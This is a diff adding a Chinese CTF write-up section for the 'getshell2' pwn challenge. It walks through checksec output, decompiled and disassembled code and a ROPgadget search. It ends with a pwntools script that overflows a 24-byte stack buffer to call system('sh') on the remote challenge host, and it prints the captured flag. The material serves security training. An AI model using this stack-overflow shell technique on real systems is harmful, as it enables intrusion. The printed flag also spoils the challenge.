@@ -4287,6 +4287,103 @@ io.interactive()
 
 ------
 
+### [getshell2](https://ce.pwnthebox.com/challenges?id=1775)
+
+先`file ./wustctf2020_getshell_2`查看文件类型再`checksec --file=./wustctf2020_getshell_2`检查了一下文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./wustctf2020_getshell_2
+./wustctf2020_getshell_2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=04705198080d6fab73e387726630da78421bd6d0, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./wustctf2020_getshell_2
+[*] '/home/tyd/ctf/pwn/pwnthebox/wustctf2020_getshell_2'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+使用`IDA pro 32bit`打开附件`wustctf2020_getshell_2`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  vulnerable();
+  return 0;
+}
+```
+
+双击`vulnerable()`函数查看详情，发现有个`char`型数组变量`buf`，`buf`的长度只有`0x18`，但是`gets()`函数读取输入到变量`buf`时限制输入的大小是`0x24`，显然存在栈溢出漏洞。
+
+```c
+ssize_t vulnerable()
+{
+  char buf[24]; // [esp+0h] [ebp-18h] BYREF
+
+  return read(0, buf, 0x24u);
+}
+```
+
+和上题 [getshell](#getshell) 不同的是，`Functions window`中的`shell`函数并不能直接用了。
+
+```c
+int shell()
+{
+  return system("/bbbbbbbbin_what_the_f?ck__--??/sh");
+}
+```
+
+我们可以选取有用的信息，在`shell`函数的汇编代码中可以看到`call _system`的地址为`0x8048529`。
+
+```assembly
+.text:0804851B                 public shell
+.text:0804851B shell           proc near
+.text:0804851B ; __unwind {
+.text:0804851B                 push    ebp
+.text:0804851C                 mov     ebp, esp
+.text:0804851E                 sub     esp, 8
+.text:08048521                 sub     esp, 0Ch
+.text:08048524                 push    offset command  ; "/bbbbbbbbin_what_the_f?ck__--??/sh"
+.text:08048529                 call    _system
+.text:0804852E                 add     esp, 10h
+.text:08048531                 nop
+.text:08048532                 leave
+.text:08048533                 retn
+.text:08048533 ; } // starts at 804851B
+.text:08048533 shell           endp
+```
+
+使用`ROPgadget`能获取到字符串`"sh"`的地址为`0x8048670`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ ROPgadget --binary ./wustctf2020_getshell_2 --string "sh"
+Strings information
+============================================================
+0x08048670 : sh
+```
+
+编写`Python`代码求解得到`PTB{1adb36f3-5905-4ed4-8b05-52a0affd97a5}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10256)
+elf = ELF('./wustctf2020_getshell_2')
+call_system = 0x8048529
+sh_addr = 0x8048670
+payload = b'a'*(0x18+0x4) + p32(call_system) + p32(sh_addr)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
 ### [ciscn_2019_n_1](https://ce.pwnthebox.com/challenges?type=4&id=524)
 
 先`file ./ciscn_2019_n_1`查看文件类型再`checksec --file=ciscn_2019_n_1`检查一下文件保护情况。
